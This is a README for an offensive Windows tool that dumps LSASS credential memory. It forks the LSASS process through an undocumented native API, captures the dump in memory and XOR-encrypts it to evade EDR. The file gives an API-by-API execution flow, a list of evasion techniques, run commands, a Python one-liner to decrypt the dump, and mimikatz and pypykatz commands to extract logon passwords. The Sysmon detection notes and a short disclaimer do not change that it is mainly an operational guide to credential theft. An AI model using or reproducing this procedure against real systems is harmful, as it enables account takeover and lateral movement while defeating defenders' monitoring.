# LsassReflectDumping

LSASS credential dumping tool using **undocumented Native API** (`RtlCreateProcessReflection`) to fork the LSASS process, then dump the clone via in-memory callback mechanism with XOR encryption, avoiding direct LSASS handle operations and static dump file signatures.

## Overview

Instead of the classic `OpenProcess(lsass.exe) → MiniDumpWriteDump(lsass handle)` pattern that most EDR sensors alert on, this tool:

1. **Forks LSASS** using `RtlCreateProcessReflection` - creates a suspended clone under a new PID
2. **Dumps the fork** (not LSASS itself) - the minidump handle points to the reflection PID
3. **Writes to memory buffer** via `MINIDUMP_CALLBACK_INFORMATION` callback - no direct file I/O from dump API
4. **XOR-encrypts in-place** with single-byte key `0x35` - no MDMP magic or credential strings on disk
5. **Flushes as opaque binary** to `f.elif` (non-`.dmp` extension) - evades signature-based detection

## Execution Flow

```
┌─ Phase 1: Initialization ────────────────────────────────────────┐
│ 1. Check elevated privileges (IsElevatedSession)                 │
│    └─ Exit with -1 if not elevated                               │
│                                                                   │
│ 2. Allocate 75 MB heap buffer via HeapAlloc                      │
│    └─ g_DiagBuffer = HeapAlloc(GetProcessHeap(), 0, 75 * 1024^2)│
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 2: LSASS Process Discovery ───────────────────────────────┐
│ 3. Enumerate processes to locate LSASS PID                       │
│    └─ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)           │
│    └─ Process32FirstW / Process32NextW loop                      │
│    └─ Target name "lsass.exe" assembled at runtime (wchar_t[])  │
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 3: LSASS Handle Acquisition ──────────────────────────────┐
│ 4. Open PROCESS_ALL_ACCESS handle to LSASS                       │
│    └─ OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid)         │
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 4: Dynamic API Resolution ────────────────────────────────┐
│ 5. Resolve RtlCreateProcessReflection at runtime                 │
│    └─ GetModuleHandleA("ntdll.dll")                              │
│    └─ API name assembled as runtime char[] (no static string)    │
│    └─ GetProcAddress(ntdll, "RtlCreateProcessReflection")       │
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 5: Process Forking ───────────────────────────────────────┐
│ 6. Clone LSASS using RtlCreateProcessReflection                  │
│    └─ Creates full process fork in suspended state (new PID)     │
│    └─ Fork does not carry lsass.exe name or credential context   │
│                                                                   │
│ 7. Sleep 5 seconds (allow clone state to stabilize)              │
│    └─ Sleep(5000)                                                 │
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 6: Minidump via In-Memory Callback ───────────────────────┐
│ 8. Register MINIDUMP_CALLBACK_INFORMATION structure              │
│    └─ CallbackRoutine = DiagBufferCallback                       │
│    └─ CallbackParam = &g_DiagBuffer                              │
│                                                                   │
│ 9. MiniDumpWriteDump(reflection_handle, ...)                     │
│    └─ IoWriteAllCallback intercepts each I/O write               │
│    └─ Callback copies bytes to g_DiagBuffer (heap memory)        │
│    └─ Entire dump assembled in memory (no disk I/O from API)     │
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 7: Encryption & Disk Write ───────────────────────────────┐
│ 10. XOR-encrypt buffer in-place                                  │
│     └─ XorBuffer(g_DiagBuffer, buffer_size, 0x35)                │
│     └─ for (i=0; i<size; i++) buffer[i] ^= 0x35                 │
│                                                                   │
│ 11. Write encrypted buffer to disk as "f.elif"                   │
│     └─ CreateFileA("f.elif", GENERIC_WRITE, ...)                │
│     └─ WriteFile(file_handle, g_DiagBuffer, buffer_size, ...)   │
│     └─ Single WriteFile call - no MDMP magic visible             │
│                                                                   │
│ 12. Sleep 5 seconds (delay before cleanup)                       │
│     └─ Sleep(5000)                                                │
└───────────────────────────────────────────────────────────────────┘

┌─ Phase 8: Validation & Cleanup ──────────────────────────────────┐
│ 13. Validate output file size > 5 MB                             │
│     └─ GetFileAttributesExA("f.elif", ...)                      │
│     └─ if (nFileSizeLow < 5*1024*1024) exit(1)                  │
│                                                                   │
│ 14. Terminate the LSASS reflection                               │
│     └─ OpenProcess(PROCESS_TERMINATE, FALSE, reflection_pid)    │
│     └─ TerminateProcess(reflection_handle, 0)                   │
│                                                                   │
│ 15. Exit cleanly (no stdout output on success)                   │
│     └─ return 0                                                   │
└───────────────────────────────────────────────────────────────────┘
```

## Native API Calls (Execution Order)

### Initialization & Discovery
| API | DLL | Purpose | Observable via |
|-----|-----|---------|----------------|
| `IsElevatedSession` | Custom | Check if token is elevated | Process context |
| `HeapAlloc` | kernel32.dll | Allocate 75 MB buffer for dump | Memory allocation (heap) |
| `CreateToolhelp32Snapshot` | kernel32.dll | Snapshot all running processes | Sysmon EventCode=1 parent context |
| `Process32FirstW` | kernel32.dll | Iterate process list (first entry) | - |
| `Process32NextW` | kernel32.dll | Iterate process list (next entry) | - |

### LSASS Access
| API | DLL | Purpose | Observable via |
|-----|-----|---------|----------------|
| `OpenProcess` | kernel32.dll | Open `PROCESS_ALL_ACCESS` handle to LSASS | **Sysmon EventCode=10** (`GrantedAccess=0x1FFFFF`) |
| `GetModuleHandleA` | kernel32.dll | Get ntdll.dll base address | Module load |
| `GetProcAddress` | kernel32.dll | Resolve `RtlCreateProcessReflection` | Dynamic API resolution |

### Process Forking & Dumping
| API | DLL | Purpose | Observable via |
|-----|-----|---------|----------------|
| **`RtlCreateProcessReflection`** | **ntdll.dll** | **Fork LSASS process (undocumented)** | **Process creation (reflection PID), Sysmon EventCode=1** |
| `Sleep` | kernel32.dll | Delay 5s (stabilize clone) | Process runtime behavior |
| `MiniDumpWriteDump` | dbghelp.dll | Dump reflection process memory | Memory access pattern |
| `DiagBufferCallback` | Custom callback | Intercept I/O, copy to heap buffer | In-memory operation (not observable) |

### Encryption & Output
| API | DLL | Purpose | Observable via |
|-----|-----|---------|----------------|
| `XorBuffer` | Custom | XOR-encrypt buffer with key `0x35` | In-memory operation (not observable) |
| `CreateFileA` | kernel32.dll | Create output file `f.elif` | **Sysmon EventCode=11** (file creation) |
| `WriteFile` | kernel32.dll | Write encrypted buffer to disk | **File I/O**, single write operation |
| `Sleep` | kernel32.dll | Delay 5s (before validation) | Process runtime behavior |
| `GetFileAttributesExA` | kernel32.dll | Validate output file > 5 MB | File metadata access |

### Cleanup
| API | DLL | Purpose | Observable via |
|-----|-----|---------|----------------|
| `OpenProcess` | kernel32.dll | Open `PROCESS_TERMINATE` handle to reflection | Process access |
| `TerminateProcess` | kernel32.dll | Kill the LSASS reflection | **Sysmon EventCode=5** (process termination) |

## Evasion Techniques Implemented

### 1. Process Reflection (T1106 Native API)
- **Classic approach**: `OpenProcess(lsass.exe) → MiniDumpWriteDump(lsass)`
  - Direct handle on LSASS process
  - Triggers EDR alerts on LSASS handle open + dbghelp.dll load
- **This tool**: `RtlCreateProcessReflection → MiniDumpWriteDump(fork)`
  - Handle points to reflection PID, not LSASS PID
  - Reflection does not carry `lsass.exe` name
  - Behavioral detectors do not correlate reflection with credential storage

### 2. Callback-Based In-Memory Dump (T1027.013 Encrypted File)
- **Classic approach**: `MiniDumpWriteDump` writes directly to file handle
  - Disk contains MDMP magic bytes
  - Readable PE headers, credential strings in cleartext
- **This tool**: `MINIDUMP_CALLBACK_INFORMATION` with `IoWriteAllCallback`
  - Dump assembled entirely in heap buffer (`g_DiagBuffer`)
  - XOR-encrypted in-place before single `WriteFile` call
  - Disk output: opaque binary noise, no signatures

### 3. Dynamic API Resolution (T1027.007)
- `RtlCreateProcessReflection` API name absent from:
  - Static string table (assembled at runtime as `char[]`)
  - Import Address Table (resolved via `GetProcAddress`)
- LSASS target name `lsass.exe` absent from strings (runtime `wchar_t[]`)
- Defeats string-based and IAT-based static detection

### 4. Non-Standard Output Extension
- Output file: `f.elif` (not `.dmp`)
- Suppresses extension-based detection rules
- File magic: encrypted bytes, not MDMP header

## Usage

### Execution (requires SYSTEM or Admin)
```powershell
ReflectDump.exe
```
- **No arguments required**
- **No stdout output on success**
- Process runs ~10 seconds (two 5-second sleeps)
- Output: `f.elif` in current working directory

### Decrypt Dump File
```bash
# XOR-decrypt with key 0x35
python -c "data=open('f.elif','rb').read(); open('lsass.dmp','wb').write(bytes(b^0x35 for b in data))"
```

### Parse Credentials Offline
```bash
# Pypykatz
pypykatz lsa minidump lsass.dmp

# Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

## Disclaimer
The content provided on this repository is for educational and informational purposes only.

### Reference 
https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass
